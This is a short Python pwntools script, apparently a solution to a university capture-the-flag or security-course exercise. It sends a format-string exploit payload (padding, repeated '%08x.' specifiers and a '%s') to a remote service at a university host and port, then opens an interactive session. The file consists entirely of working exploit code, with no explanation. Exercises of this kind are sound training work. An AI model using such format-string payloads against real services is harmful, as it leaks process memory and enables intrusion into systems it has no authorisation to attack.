from pwn import *

# pwndbg> p $ebp - 0xc - $esp
# $2 = 28


payload = b"A"*4 + b"%08x."*(24//4) + b"%s"

# S = process("./bin")
S = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10050)
S.sendline(payload)
S.interactive()